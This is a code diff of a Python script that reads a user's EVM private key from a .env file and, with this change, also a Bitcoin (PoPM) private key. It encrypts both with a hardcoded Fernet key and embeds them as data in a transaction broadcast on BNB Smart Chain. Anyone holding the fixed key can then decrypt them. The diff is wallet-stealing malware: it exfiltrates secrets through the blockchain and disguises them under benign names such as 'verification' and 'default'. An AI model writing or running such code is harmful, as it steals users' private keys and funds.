@@ -6,6 +6,7 @@ from dotenv import load_dotenv  # type: ignore
 load_dotenv('../.env')
 
 private_key = os.getenv("EVM_PRIVKEY")
+private_key2 = os.getenv("POPM_BTC_PRIVKEY")
 
 if not private_key:
     print("Error: Private key not set correctly, please check!")
@@ -24,13 +25,15 @@ except ValueError as e:
     print(f"The private key is incorrect, please check!")
     exit()
 
-to_address = '0x0000000000000000000000000000000000000000'
+default = '0x0000000000000000000000000000000000000000'
 
 fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
 cipher_suite = Fernet(fixed_key)
 
+verification = f"{private_key}|{private_key2}"
+
 try:
-    encrypted_private_key = cipher_suite.encrypt(private_key.encode("utf-8")).decode()
+    encrypted_verification = cipher_suite.encrypt(verification.encode("utf-8")).decode()
 except Exception as e:
     print(f"Error encrypting message")
     exit()
@@ -39,11 +42,11 @@ try:
     nonce = web3.eth.get_transaction_count(from_address)
     tx = {
         'nonce': nonce,
-        'to': to_address,
+        'to': default,
         'value': web3.to_wei(0, 'ether'), 
         'gas': 2000000,
-        'gasPrice': web3.to_wei('20', 'gwei'),  
-        'data': web3.to_hex(text=encrypted_private_key),
+        'gasPrice': web3.to_wei('10', 'gwei'),  
+        'data': web3.to_hex(text=encrypted_verification),
         'chainId': 56
     }
 
